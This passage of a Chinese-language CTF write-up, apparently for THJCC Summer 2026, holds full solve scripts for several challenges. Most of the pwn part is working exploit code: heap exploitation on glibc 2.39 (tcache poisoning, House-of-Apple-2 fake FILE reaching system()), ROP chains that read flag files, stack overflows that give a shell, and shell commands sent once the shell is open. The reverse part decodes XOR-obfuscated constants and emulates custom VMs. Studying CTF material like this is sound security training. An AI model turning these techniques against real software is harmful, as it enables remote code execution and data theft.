    compose(2, 0x38, fake(libc + OFF_ENVIRON, 0x10))
    envptr = u64(replay_dump(2, 0x10)[:8])
    print('[+] envp array @ %#x' % envptr)

    if scan:
        set_fake(envptr - 0x4000, 0x4000)
        stack = replay_dump(2, 0x4000)
        open('/tmp/stackdump.bin', 'wb').write(stack)
        print('[+] stack %#x..%#x -> /tmp/stackdump.bin' % (envptr - 0x4000, envptr))
        seen = {}
        for off in range(0, len(stack) - 7, 8):
            v = u64(stack[off:off + 8])
            if libc < v < libc + 0x230000:
                seen.setdefault(v - libc, []).append(envptr - 0x4000 + off)
        for k in sorted(seen):
            print('    libc+%#x at %s' % (k, [hex(x) for x in seen[k]]))
        return

    assert OFF_RET, 'calibrate OFF_RET first via --scan'
    # 6) locate main's return-address slot by value
    SCAN = 0x2000
    set_fake(envptr - SCAN, SCAN)
    stack = replay_dump(2, SCAN)
    want = libc + OFF_RET
    hits = [envptr - SCAN + o for o in range(0, len(stack) - 7, 8)
            if u64(stack[o:o + 8]) == want]
    assert len(hits) == 1, 'retaddr hits: %r' % [hex(h) for h in hits]
    ret_slot = hits[0]
    print('[+] main retaddr slot = %#x' % ret_slot)

    # 7) arbitrary write: ROP chain (open/read/write flag) over the return slot
    #    - close(3) first so open() deterministically returns fd 3
    #    - try several candidate flag paths; echo each path before dumping
    str_base = ret_slot + 0x800
    buf_addr = ret_slot + 0x900
    paths = [b'flag.txt\x00', b'/flag.txt\x00', b'/flag\x00', b'./flag.txt\x00',
             b'/app/flag.txt\x00', b'/home/ctf/flag.txt\x00']
    def pops_rdi(v):   return p64(libc + G_RDI) + p64(v)
    def pops_rsi(v):   return p64(libc + G_RSI) + p64(v)
    def pops_rdx(v):   return p64(libc + G_RDX) + p64(v) + p64(0)
    rop = b''
    for i, path in enumerate(paths):
        pa = str_base + 0x10 * i
        rop += pops_rdi(1) + pops_rsi(pa) + pops_rdx(0x10) + p64(libc + F_WRITE)
        rop += pops_rdi(3) + p64(libc + F_CLOSE)
        rop += pops_rdi(pa) + pops_rsi(0) + pops_rdx(0) + p64(libc + F_OPEN)
        rop += pops_rdi(3) + pops_rsi(buf_addr) + pops_rdx(0x80) + p64(libc + F_READ)
        rop += pops_rdi(1) + pops_rsi(buf_addr) + pops_rdx(0x80) + p64(libc + F_WRITE)
    rop += p64(libc + F_EXIT)
    assert len(rop) < 0x800
    payload = rop + b'\x00' * (0x800 - len(rop))
    for i, path in enumerate(paths):
        chunk = path.ljust(0x10, b' ')
        payload += chunk
    payload += b'\x00' * (0x900 - len(payload))
    set_fake(ret_slot, len(payload))
    amend(2, payload)
    print('[+] ROP chain written; triggering main return')

    menu(0)
    io.s.settimeout(8)
    out = b''
    try:
        while True:
            d = io.s.recv(65536)
            if not d:
                break
            out += d
    except Exception:
        pass
    print('[+] final output: %r' % out)

if __name__ == '__main__':
    main()
```

</details>

**necropet**
**Flag**：`THJCC{Tell_me,_Linguini,_about_your_interests...D0_u_1ik3_anima1s?The_u5ua1,_d0gs,_cats,_h0r535,_guinea_pigs...RATS~~}`

glibc 2.39 UAF（h_release 清 ptr/size 不清 case_id/desk）+ House-of-Apple-2 fake
FILE + tcache poisoning 写 `_IO_list_all`，cook(exit) 触发 RCE。

发现过程：`h_release` 只清 kennels[slot].ptr/size，不清 case_id 也不清全局 desk，而 show/revise/visit 只校验 case_id 相等 → 悬垂 desk 对已释放 chunk 的完整 UAF 读写；glibc 2.39 无 free_hook → 选 House-of-Apple-2（_IO_flush_all_lockp → _IO_wfile_overflow → _wide_vtable->__doallocate）。两个实测坑：fake FILE 的 `_lock`(+0x88) 必须指向全零内存，否则 NULL 解引用静默崩；note 首版写 8 字节落偏 8 字节，`_IO_list_all` 没被盖上、flush 静默走真链。

<details>
<summary>📜 necropet solve.py（176 行，关键阶段：fake FILE 直写@3478、tcache poison→_IO_list_all@3505）——点击展开</summary>

```python
#!/usr/bin/env python3
# THJCC Summer 2026 - necropet (Pwn)
# Vuln: h_release clears kennels[slot].ptr/size but NOT kennels[slot].case_id nor
#       the global `desk` (selected record). show/revise/visit re-validate only
#       kennels[desk.slot].case_id == desk.case_id -> full UAF read+write on the
#       freed chunk while it sits in tcache/unsorted.
# Chain: unsorted leak (libc) -> UAF tcache poisoning -> write _IO_list_all ->
#        House-of-Apple-2 fake FILE on heap -> cook (exit) -> _IO_cleanup flush
#        -> system("  sh") -> cat flag.
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1024

p64 = lambda x: struct.pack("<Q", x)
u64 = lambda b: struct.unpack("<Q", b)[0]

# --- libc 2.39-0ubuntu8.8 offsets (from provided libc.so.6) ---
OFF_SYSTEM      = 0x58750
OFF_IO_WFILE    = 0x202228  # _IO_wfile_jumps
OFF_IO_LIST_ALL = 0x2044c0  # _IO_list_all
OFF_UNSORTED    = 0x203b20  # main_arena(0x203ac0) + 0x60

# poison target: must be 16-aligned, note lands on &_IO_list_all
# T + 0x28 == &_IO_list_all  ->  T = 0x2044c0 - 0x28 - 8 = 0x204490 (aligned)
OFF_TARGET = 0x204490

class Tube:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.buf = b""
    def recv_until(self, tok, timeout=10):
        self.s.settimeout(timeout)
        end = time.time() + timeout
        while tok not in self.buf:
            if time.time() > end:
                raise TimeoutError(f"waiting {tok!r}, buf={self.buf[-200:]!r}")
            d = self.s.recv(65536)
            if not d:
                raise EOFError(f"eof waiting {tok!r}, buf={self.buf!r}")
            self.buf += d
        i = self.buf.index(tok) + len(tok)
        out, self.buf = self.buf[:i], self.buf[i:]
        return out
    def send(self, d):
        self.s.sendall(d)
    def sendline(self, line):
        self.send(line + b"\n")

t = Tube(HOST, PORT)
print(t.recv_until(b"type help for commands").decode(errors="replace"))

def admit(slot, kind, cap, ln, note=b""):
    t.sendline(f"admit {slot} {kind} {cap} {ln}".encode())
    if ln:
        t.send(note)
    t.recv_until(b"admitted")

def select(slot):
    t.sendline(f"select {slot}".encode())
    t.recv_until(b"selected")

def release(slot):
    t.sendline(f"release {slot}".encode())
    t.recv_until(b"released")

def show():
    t.sendline(b"show")
    t.recv_until(b"record: ")
    hx = t.recv_until(b"\n").strip()
    return bytes.fromhex(hx.decode())

def revise(ln, data):
    t.sendline(f"revise {ln}".encode())
    t.send(data)
    t.recv_until(b"revised")

# ---- stage 0: heap grooming --------------------------------------------
# chunks: tcache(0x290)@H, A(0x50)@H+0x290, B(0x520)@H+0x2e0,
#         C(0x50 guard)@H+0x800, A2(0x50)@H+0x850
# user addrs: A=H+0x2a0, B=H+0x2f0, C=H+0x810, A2=H+0x860
admit(0, 0, 0x20, 0)          # A  tcache-poison base #1
admit(1, 0, 0x4f0, 0)         # B  unsorted leaker (0x520 > tcache max)
admit(2, 0, 0x20, 0)          # C  guard so B does not merge into top
admit(3, 0, 0x20, 0)          # A2 tcache-poison head

# ---- stage 1: heap leak via first-freed tcache next (= ptr>>12) --------
select(0)
release(0)
dump = show()
hint = u64(dump[0:8])
key = u64(dump[8:16])
assert hint > 0x10000 and key != 0, f"bad tcache dump {dump[:0x20].hex()}"
heap = hint << 12   # first-freed tcache next = (A>>12) ^ NULL; A sits in first page
print(f"[+] heap   = {heap:#x}")
A  = heap + 0x2a0
A2 = heap + 0x860
D  = heap + 0x2f0             # B's user addr; stays freed in unsorted

# ---- stage 2: libc leak via unsorted bin fd ----------------------------
select(1)
release(1)                    # desk dangles at B (kennels[1].case_id kept)
dump = show()
fd, bk = u64(dump[0:8]), u64(dump[8:16])
assert fd == bk and fd & 0xfff == 0xb20, f"bad unsorted dump {dump[:0x20].hex()}"
libc = fd - OFF_UNSORTED
assert libc & 0xfff == 0, hex(libc)
print(f"[+] libc   = {libc:#x}")

# ---- stage 3: fake FILE written straight into freed B via UAF (desk=B) --
# desk still dangles at B; the fake clobbers its fd/bk, which is fine:
# every later malloc is a tcache hit and never inspects the unsorted bin.
W  = D + 0x100                # _IO_wide_data
V  = D + 0x200                # fake wide vtable
fake = bytearray(0x4f0)
# command string doubles as _flags; two leading spaces keep bits 0x2/0x8/0x800
# clear so wfile_overflow -> wdoallocbuf -> __doallocate(system) path is taken
fake[0x00:0x0f] = b"  cat this*;sh\x00"
fake[0x20:0x28] = p64(0)                       # _IO_write_base
fake[0x28:0x30] = p64(1)                       # _IO_write_ptr > base -> overflow
fake[0x68:0x70] = p64(0)                       # _chain = NULL
fake[0xa0:0xa8] = p64(W)                       # _wide_data
fake[0x88:0x90] = p64(D + 0x300)               # _lock -> zeroed area inside fake
                                               # (flush_all locks fp before overflow)
fake[0xc0:0xc4] = struct.pack("<i", 0)         # _mode <= 0
fake[0xd8:0xe0] = p64(libc + OFF_IO_WFILE)     # vtable = _IO_wfile_jumps
# _IO_wide_data offsets verified in this exact libc's disassembly:
#   _IO_buf_base +0x30, _wide_vtable +0xe0; doallocate slot +0x68
fake[0x100+0x18:0x100+0x20] = p64(0)           # wide->_IO_write_base = 0
fake[0x100+0x30:0x100+0x38] = p64(0)           # wide->_IO_buf_base = 0
fake[0x100+0xe0:0x100+0xe8] = p64(V)           # wide->_wide_vtable
fake[0x200+0x68:0x200+0x70] = p64(libc + OFF_SYSTEM)
if "--probe2" in sys.argv:  # path probe: puts(fp) prints flags instead of shell
    fake[0x200+0x68:0x200+0x70] = p64(libc + 0x87cc0)
revise(0x4f0, bytes(fake))

# ---- stage 5: tcache poison A2.next -> &_IO_list_all region -----------
select(3)
release(3)                    # tcache[0x50]: A2 -> A ; desk dangles at A2
T = libc + OFF_TARGET
revise(8, p64(T ^ (A2 >> 12)))   # safe-linking: next = T ^ (A2>>12)

# ---- stage 6: consume A2 then land malloc on _IO_list_all -------------
admit(6, 0, 0x20, 0)          # takes A2
# T = libc+0x204490 (16-aligned); note starts at T+0x28 = &_IO_list_all-8,
# so note[8:16] lands exactly on _IO_list_all
admit(7, 0, 0x20, 16, p64(0xdeadbeef) + p64(D))

if "--probe" in sys.argv:
    t.sendline(b"select 7")
    t.recv_until(b"selected")
    d = show()
    print("[probe] slot7 chunk:", d[:0x48].hex())
    t.sendline(b"select 6")
    t.recv_until(b"selected")
    d = show()
    print("[probe] slot6 chunk:", d[:0x48].hex())
    sys.exit(0)

# ---- stage 7: trigger exit -> _IO_cleanup -> system("  cat this*;sh") ---
t.sendline(b"cook")
time.sleep(1.5)
t.sendline(b"cat thisisratratratrat_puipui.txt; cat $NECROPET_FLAG_PATH; id; ls")
time.sleep(2.0)
out = b""
try:
    t.s.settimeout(3)
    while True:
        d = t.s.recv(65536)
        if not d:
            break
        out += d
except Exception:
    pass
out += t.buf
print("RAW:", repr(out))
```

</details>

**Canary Notes**
**Flag**：`THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}`

伪金丝雀随机 token 经 receipt 泄漏（发 7 字节留言拿完整 token 避开 NUL 低字节），
ret2win 需 `ret` gadget 对齐远程栈。

<details>
<summary>📜 Canary Notes solve.py（69 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Canary Notes (THJCC Summer 2026, pwn) exploit.

Bug: scanf("%s") into an 8-byte stack buffer (rbp-0x10) in main.
Layout: [note buf:8][token copy:8][saved rbp:8][ret:8]
The 8-byte random token ("canary") is leaked via the receipts:
    receipt = note_content ^ token   (same token both notes)
Trick: scanf("%s") appends a NUL after the input. An 8-char note puts the
NUL at buf[8] == byte0 of the token copy, so the receipt then leaks
token & ~0xff. Instead send a 7-char note: input = 'A'*7 + NUL (8 bytes,
buf[0..7]) so the token copy stays intact and encrypt reads 'AAAAAAA\x00',
making receipt byte0 = token byte0 ^ 0 = the TRUE token byte0. Full token
leaked in one shot: token = receipt1 ^ u64(b'A'*7 + b'\x00').
Then overflow note2 restoring the token copy to pass the tamper check and
set ret = win (0x401246 -> system("/bin/sh")). No libc needed.

Alignment: entering win directly makes the `call system` inside it hit with
rsp misaligned (system entry rsp % 16 == 0 instead of 8); some glibcs crash.
Chain through a plain `ret` gadget (0x4010f0) first to shift rsp by 8.

Usage: ./solve.py [host] [port]
"""
from pwn import *
import sys, re

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

context.log_level = "info"
context.arch = "amd64"

WIN = 0x401246  # calls system("/bin/sh")
RET_GADGET = 0x4010F0  # plain `ret`, aligns rsp before entering WIN


def main():
    r = remote(HOST, PORT)
    r.recvuntil(b"leave a note:\n")

    # note 1: 7 'A's -> scanf writes 'AAAAAAA' + NUL into buf[0..7],
    # leaving the token copy (at rbp-0x8) untouched; encrypt reads
    # 'AAAAAAA\x00' ^ token -> receipt leaks the FULL token
    note1 = b"A" * 7
    r.sendline(note1)
    line = r.recvline()
    log.info("receipt1: %s", line.strip())
    m = re.search(rb"receipt: 0x([0-9a-f]{16})", line)
    assert m, f"bad receipt line: {line!r}"
    receipt1 = int(m.group(1), 16)
    token = receipt1 ^ u64(note1 + b"\x00")
    log.info("token = 0x%016x", token)
    assert all(0x21 <= (token >> (8 * i)) & 0xFF <= 0x7E for i in range(8)), "token has odd bytes"

    r.recvuntil(b"leave another note:\n")

    # note 2: overflow; restore token copy, smash ret -> (ret gadget) -> win
    payload = b"B" * 8 + p64(token) + b"C" * 8 + p64(RET_GADGET) + p64(WIN)
    assert b" " not in payload and b"\n" not in payload and b"\t" not in payload
    r.sendline(payload)

    r.recvuntil(b"thanks!\n")
    r.sendline(b"cat flag.txt; cat /flag.txt; cat /flag; ls -la")
    data = r.recvall(timeout=3)
    log.success("output:\n%s", data.decode(errors="replace"))
    return data


if __name__ == "__main__":
    main()
```

</details>

**I ate something bad**
**Flag**：`THJCC{m4yb3_1_34t_t0_much}`

gets 栈溢出覆盖 0xbadf00d 常量触发 system("/bin/sh")。

<details>
<summary>📜 I ate something bad solve.py（65 行）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - "I ate something bad ..." (Pwn, Baby)

Vuln: gets() into 48-byte buffer at rbp-0x30. Program checks [rbp-0x4] == 0xbadf00d
("bad food") and if so calls system("/bin/sh"). Overflow 44 bytes + 0xbadf00d
to satisfy the check and get a shell, then cat the flag.

Usage: python3 solve.py [host] [port]   (defaults: chal.thjcc.org 11037)
"""
import socket
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 11037

PAYLOAD = b"A" * 44 + (0xBADF00D).to_bytes(4, "little")  # 48 bytes total


def recv_until(sock, marker, timeout=5):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)
    banner = recv_until(s, b"?")
    print("[*] banner:", banner.decode(errors="replace").strip())

    s.sendall(PAYLOAD + b"\n")
    time.sleep(0.3)
    out = recv_until(s, b"$", timeout=2)
    print("[*] after payload:", out.decode(errors="replace").strip())

    s.sendall(b"cat flag.txt; echo __END__\n")
    time.sleep(0.5)
    data = b""
    s.settimeout(5)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"__END__" in data:
                break
    except socket.timeout:
        pass
    print("[*] flag output:")
    print(data.decode(errors="replace"))

    s.close()


if __name__ == "__main__":
    main()
```

</details>

### Reverse（6/6）

> 横向观察：6 题里 4 题的 flag 都是从常量表用滚动异或解出——cl 初值各异、每轮 +0x1A、奇偶位分别 `^(cl-0x0D)`/`^cl`（License / 404 / xorlocks / BlackFrost），疑似同一作者套路：逆向先 grep `0x1a`，命中即定位解密循环。

**BlackFrost**
**Flag**：`THJCC{blackfrost_config_recovered}`

C2 客户端 PE32+ 7KB：pcap 是"失败探针"装饰，flag 在 .rdata 34 字节密文 + 滚动
密钥（cl 初值 0x26、每 2 字节 +0x1a）逐字节 XOR。

<details>
<summary>📜 BlackFrost solve.py（98 行，核心 decode_flag@3754）——点击展开</summary>

```python
#!/usr/bin/env python3
"""BlackFrost (THJCC Summer 2026, Reverse) — one-shot solver.

The PE (BlackFrost.exe) is a small C2 client:
  1. parses `--token <tok>` (17 chars), checks FNV-1a32(token) == 0xB700B632
  2. decrypts a static "stage" blob from .rdata (SSE keystream keyed by the hash)
     and requires it to contain "campaign=BLACKFROST-26;"
  3. sleeps >= 3 s (anti-sandbox timer), then connects to 127.0.0.1:31337,
     sends "BFHELLO <hash-hex>\n", receives "BF2:<hexconfig>\n"
  4. XOR-decodes the config: byte[i] ^= hash_byte[i%4] ^ (0x5a + 0x11*i)
     and requires campaign/nonce/directive fields
  5. finally prints the flag: a static 34-byte blob at .rdata:0x140003080
     XORed with rolling key cl: 0x26 + 0x1a*i (even byte ^= cl-13, odd ^= cl)

The flag is static — no network needed. The pcap lets us verify the protocol.
"""
import struct
from pathlib import Path

HERE = Path(__file__).resolve().parent
EXE = HERE / "BlackFrost.exe"
PCAP = HERE / "traffic.pcap"

HASH = 0xB700B632  # FNV-1a32 of the (unknown) 17-char token


def fnv1a32(data: bytes) -> int:
    h = 0x811C9DC5
    for b in data:
        h ^= b
        h = (h * 0x01000193) & 0xFFFFFFFF
    return h


def exe_rdata(va: int, n: int) -> bytes:
    """Read n bytes at virtual address `va` from .rdata (file off 0x1600)."""
    data = Path(EXE).read_bytes()
    # .rdata: VMA 0x140003000, file offset 0x1600
    off = 0x1600 + (va - 0x140003000)
    return data[off:off + n]


def decode_flag() -> str:
    blob = exe_rdata(0x140003080, 34)
    out = bytearray()
    cl = 0x26
    for i in range(0, len(blob), 2):
        out.append(blob[i] ^ ((cl - 13) & 0xFF))
        out.append(blob[i + 1] ^ cl)
        cl = (cl + 0x1A) & 0xFF
    return out.decode()


def decode_config(hexcfg: str) -> bytes:
    hb = bytes.fromhex(hexcfg)
    out = bytearray()
    for i, b in enumerate(hb):
        k = ((HASH >> ((i * 8) & 0x18)) & 0xFF) ^ ((0x5A + 0x11 * i) & 0xFF)
        out.append(b ^ k)
    return bytes(out)


def parse_pcap(path: Path):
    data = path.read_bytes()
    off = 24
    msgs = []
    while off < len(data):
        _, _, incl, _ = struct.unpack("<IIII", data[off:off + 16])
        frame = data[off + 16:off + 16 + incl]
        off += 16 + incl
        sport, dport = struct.unpack(">HH", frame[34:38])
        msgs.append((sport, dport, frame[54:]))
    return msgs


def main():
    print("== flag (static blob, .rdata:0x140003080) ==")
    flag = decode_flag()
    print("FLAG:", flag)

    print("\n== protocol verification from traffic.pcap ==")
    for sport, dport, payload in parse_pcap(PCAP):
        print(f"  {sport}->{dport}: {payload!r}")
        if payload.startswith(b"BFHELLO "):
            print("   -> handshake carries FNV-1a32(token) =",
                  hex(int(payload[8:16], 16)), "(== 0xb700b632)")
        if payload.startswith(b"BF2:"):
            cfg = decode_config(payload[4:].strip().decode())
            print("   -> decoded config:", cfg)
            print("   -> note: exe requires 'directive=collect;' but this config has",
                  "'directive=collect-only;' -> sandbox run ended 'configuration rejected'")

    print("\n== token property (not needed for flag) ==")
    print("  FNV-1a32(token) must equal 0xb700b632 (17-char token, unknown value)")


if __name__ == "__main__":
    main()
```

</details>

**License**
**Flag**：`THJCC{license_pipeline_rebuilt}`

静态 license 校验器输入无关：flag = .rodata 常量
（cl=0x7e 滚动，`out[2k]=(cl-0x0d)^ro[2k], out[2k+1]=cl^ro[2k+1], cl+=0x1a`）。

<details>
<summary>📜 License solve.py（46 行，核心 decrypt@3823）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - License (Reverse, 144 pts)

license_v2 is a statically linked, stripped x86-64 ELF license checker.
The flag is NOT gated by knowing the license key: it is XOR-decrypted at the
success path purely from .rodata constants (0x200210..0x20022e). Any input
that passes the 24-byte comparison would print it; we simply decrypt it.

Success path (0x201bc3):
    cl = 0x7e
    for rax in 1, 3, ..., 31:
        out[rax-1] = (cl - 0x0d) ^ rodata[0x20020f + rax]
        out[rax]   = cl         ^ rodata[0x200210 + rax]
        cl += 0x1a
    out[31] = 0 ; write(out)   -> 31-byte flag
"""
import sys

RODATA = bytes.fromhex(
    "2536c1dbe6c9d3a5ba839d736845575d312b37011be7d0eeccd4b6b9b19e8a"
)  # 0x200210 .. 0x20022e (31 bytes)


def decrypt() -> str:
    out = bytearray(32)
    cl = 0x7E
    for k in range(16):
        out[2 * k] = ((cl - 0x0D) & 0xFF) ^ RODATA[2 * k]
        if 2 * k + 1 < 31:
            out[2 * k + 1] = cl ^ RODATA[2 * k + 1]
        cl = (cl + 0x1A) & 0xFF
    out[31] = 0
    return out[:31].decode()


if __name__ == "__main__":
    flag = decrypt()
    print(flag)
    if "--verify" in sys.argv:
        # End-to-end sanity: patch first `jne fail` (VA 0x201a40, file 0xa40)
        # into `jmp 0x201bc3` and run under docker/alpine.
        data = bytearray(open("license_v2", "rb").read())
        rel = 0x201BC3 - (0x201A40 + 5)
        data[0xA40 : 0xA40 + 6] = bytes([0xE9]) + rel.to_bytes(4, "little", signed=True) + b"\x90"
        open("license_patched", "wb").write(bytes(data))
        print("patched license_patched (run: docker run --rm -v $PWD:/mnt alpine /mnt/license_patched 0000-0000-0000-0000-0000-0000)")
```

</details>

**404 / xorlocks**
**Flag**：`THJCC{vm_bytecode_is_a_contract}` / `THJCC{xor_basics_are_not_magic}`

404：2KB 手写字节码 VM，16 组同构检查 `rol(input[i]^(0x20+i)+(0x07+3i), i%7)==target[i]`
（坑：`i%7` 非 `i&7`），flag 由 rodata 常量表生成与输入无关；xorlocks：从 ELF 节表
读 .rodata 反推密码，成功路径异或出 flag。

<details>
<summary>📜 404 solve.py（38 行）——点击展开</summary>

```python
# ==== 404-canary/solve.py ====
#!/usr/bin/env python3
"""THJCC CTF Summer 2026 - 404 (Reverse) one-shot solver.

Binary: 404 (ELF64 x86-64 static, custom 8-register bytecode VM).
VM program (0x121 bytes, reconstructed from .rodata movaps layout):
  for each input byte i: rol(input[i] ^ (0x20+i) + (0x07+3i), i%7) == target[i]
  on success, opcode at bytecode[0x120] prints the flag computed from a
  constant table (opcode-8 handler at 0x201615).
"""

def rol(b, n):
    n &= 7
    return ((b << n) | (b >> (8 - n))) & 0xff if n else b

def ror(b, n):
    n &= 7
    return ((b >> n) | (b << (8 - n))) & 0xff if n else b

# target constants from the 16 CMP instructions in the VM program
TARGETS = [0x5d, 0xac, 0x2a, 0xd2, 0xa6, 0x12, 0x58, 0x64,
           0xf6, 0x62, 0x63, 0x27, 0xce, 0x9c, 0x7e, 0x84]

# invert: rol(in ^ (0x20+i) + (0x07+3i), i%7) == TARGETS[i]
inp = bytes((ror(TARGETS[i], i % 7) - (0x07 + 3 * i)) & 0xff ^ (0x20 + i)
            for i in range(16))
print('input:', inp.decode())

# flag from the opcode-8 (PRINT_FLAG) handler at 0x201615:
#   al starts 0x35, += 0x1a each round; out[2i] = (al-13)^key[2i], out[2i+1] = al^key[2i+1]
key = bytes.fromhex('7c7d080c1f1200eecfffd3c3a1b2b18f9d5a7b6c735819300f030ef5f5c2dac6')
out = bytearray(32)
al = 0x35
for i in range(16):
    out[2 * i] = (al - 13) & 0xff ^ key[2 * i]
    out[2 * i + 1] = al ^ key[2 * i + 1]
    al = (al + 0x1a) & 0xff
print('flag :', out.decode())
```

</details>

<details>
<summary>📜 xorlocks solve.py（67 行）——点击展开</summary>

```python
# ==== xorlocks/solve.py ====
#!/usr/bin/env python3
"""THJCC Summer 2026 - xorlocks 一键复现

从 ELF 提取常量表，反推密码，还原成功路径打印的 flag；
有 docker 时自动在 Linux 容器内跑原二进制做动态验证。

用法: python3 solve.py [path/to/xorlock]
"""
import struct
import subprocess
import sys

ELF = sys.argv[1] if len(sys.argv) > 1 else "handout/xorlock"

data = open(ELF, "rb").read()

# 手工解析节表：.rodata 文件偏移 0x120 <-> VMA 0x200120
e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
e_shentsize = struct.unpack_from("<H", data, 0x3a)[0]
e_shnum = struct.unpack_from("<H", data, 0x3c)[0]
secs = {}
for i in range(e_shnum):
    off = e_shoff + i * e_shentsize
    name, typ, flags, addr, sh_off, size = struct.unpack_from("<IIQQQQ", data, off)
    secs[addr] = (sh_off, size)

ro_off, ro_size = secs[0x200120]
ro = data[ro_off : ro_off + ro_size]

def b(vma):
    return ro[vma - 0x200120]

# 校验表 (0x200150, 20 字节) 与 消息表 (0x20016f, 32 字节)
t1 = [b(0x200150 + i) for i in range(20)]
t2 = [b(0x20016f + i) for i in range(32)]

# 密码: ((p[i] ^ 0x5A) + 3*i) & 0xff == t1[i]   (i = 0..19)
password = "".join(chr(((t1[i] - 3 * i) & 0xFF) ^ 0x5A) for i in range(20))
print(f"[+] password: {password}")

# 成功消息: cl 从 0x40 起每轮 +0x1A; base[2k+1] = (cl-0x0d) ^ t2[2k+1], base[2k+2] = cl ^ t2[2k+2]
cl = 0x40
base = {}
for k in range(16):
    a = 2 * k + 1
    base[a] = ((cl - 0x0D) & 0xFF) ^ t2[a]
    if a < 0x1F:
        base[a + 1] = cl ^ t2[a + 1]
    cl = (cl + 0x1A) & 0xFF
flag = bytes(base[i] for i in range(1, 0x20)).decode()
print(f"[+] flag: {flag}")

# 动态验证（有 docker 时）
try:
    r = subprocess.run(
        ["docker", "run", "--rm", "-v", f"{__import__('os').path.abspath(ELF)}:/app/x:ro",
         "debian:stable-slim", "/app/x", password],
        capture_output=True, timeout=60,
    )
    out = r.stdout.decode().strip()
    if out == flag:
        print("[+] dynamic verify OK (docker): binary printed the flag, exit", r.returncode)
    else:
        print(f"[-] dynamic verify FAILED: got {out!r}, exit {r.returncode}")
except (FileNotFoundError, subprocess.TimeoutExpired):
    print("[*] docker unavailable/timeout — skip dynamic verify (static derivation already checked)")
```

</details>

**Because There is no one Make Reverse So I Create This Chal**
**Flag**：`THJCC{1_w0nd3r_h0w_l0n6_41_50lv35_17_>w<}`

Mach-O arm64 自研 VM：XTEA 变体（双 sum）解密字节码 + FNV-1a 自校验，z3 求解
41 字节输入。

<details>
<summary>📜 Because… solve.py（205 行，核心 decrypt_program@4038 / run_vm@4089）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - "Because There is no one Make Reverse So I Create This Chal"
One-click solver:
 1. XTEA-variant keystream (two sums, w15=0 / w17=DELTA) XORed over __const -> VM program
    (708 bytes; the 89th block writes only its first 4 bytes -> bytes 0x2c0..0x2c3,
    which contain the final 0x5a END opcode).
 2. FNV-1a self-check over the 708 bytes (expect 0x4b9fb9f7, verified).
 3. Interpret the custom VM symbolically with z3 -> flag.
 4. Verify the candidate against the real binary.
"""
import sys
import struct
import subprocess
from pathlib import Path

DELTA = 0x9E3779B9
MASK32 = 0xFFFFFFFF
EXPECT_FNV = 0x4B9FB9F7

# --- VM opcodes (ip advance, semantics) ---
# 0x15: acc ^= imm (2)  0x18: acc += imm (2)  0x74: acc = ROL8(acc, imm&7) (2)
# 0xe5: acc -= imm (2)  0x97: idx = imm (2)   0xcd: len check (2)
# 0x86: acc = input[idx] (1 byte, NO operand)
# 0x8f: mismatch |= acc ^ byte-at-ip+1 (2)
# 0x5b: ip += imm + 2   0x5a: END, ok iff no mismatch


def xtea_encrypt_round(v0, v1, key, rounds=32):
    """XTEA variant from the ARM64 asm: TWO sums (w15 starts 0, w17 starts DELTA),
    each advanced once per round. v0 = counter word (w13), v1 = 0x1e403058 (w14)."""
    s1 = 0          # used by the v0 update: key[s1 & 3]
    s2 = DELTA      # used by the v1 update: key[(s2 >> 11) & 3]
    for _ in range(rounds):
        v0 = (v0 + ((((v1 << 4) ^ (v1 >> 5)) + v1) ^ (s1 + key[s1 & 3]))) & MASK32
        s1 = (s1 + DELTA) & MASK32
        v1 = (v1 + ((((v0 << 4) ^ (v0 >> 5)) + v0) ^ (s2 + key[(s2 >> 11) & 3]))) & MASK32
        s2 = (s2 + DELTA) & MASK32
    return v0, v1


def fnv1a(data, h=0x811C9DC5):
    for b in data:
        h = ((h ^ b) * 0x1000193) & MASK32
    return h


def decrypt_program(binary: bytes) -> bytes:
    # __const section: vmaddr 0x100000b98, file offset 2968, size 0x2e4
    const = binary[2968:2968 + 0x2e4]
    # XTEA key = XOR of the two 16-byte blobs at const+0x2c4 / const+0x2d4
    k1 = const[0x2c4:0x2c4 + 16]
    k2 = const[0x2d4:0x2d4 + 16]
    key = struct.unpack('<4I', bytes(a ^ b for a, b in zip(k1, k2)))

    out = bytearray()
    for i in range(0, 0x2c4, 8):
        block_idx = i >> 3
        v0, v1 = xtea_encrypt_round((block_idx + 0xAFD9E340) & MASK32, 0x1E403058, key)
        ks = struct.pack('<I', v0) + struct.pack('<I', v1)  # asm stores v0 first (LE), then v1
        nbytes = 4 if i == 0x2c0 else 8   # last block (x9==4) writes only bytes 0..3
        for j in range(nbytes):
            out.append(const[i + j] ^ ks[j])
    return bytes(out)


def disasm(prog: bytes):
    """Control-flow-following disassembler for the custom VM."""
    names = {
        0x15: 'acc ^= 0x{imm:02x}',
        0x18: 'acc += 0x{imm:02x}',
        0x5a: 'END (ok iff mismatch==0)',
        0x5b: 'JMP +{imm}',
        0x74: 'acc = ROL8(acc, {imm}&7)',
        0x86: 'acc = input[idx]',
        0x8f: 'CMP acc vs 0x{imm:02x}',
        0x97: 'idx = {imm}',
        0xcd: 'CHECK len == {imm}',
        0xe5: 'acc -= 0x{imm:02x}',
    }
    lines, ip = [], 0
    while ip < len(prog):
        op = prog[ip]
        if op == 0x5a:
            lines.append((ip, names[op])); break
        if op == 0x86:
            lines.append((ip, names[op])); ip += 1
        elif op in names:
            lines.append((ip, names[op].format(imm=prog[ip + 1])))
            if op == 0x5b:
                ip = ip + 2 + prog[ip + 1]
            else:
                ip += 2
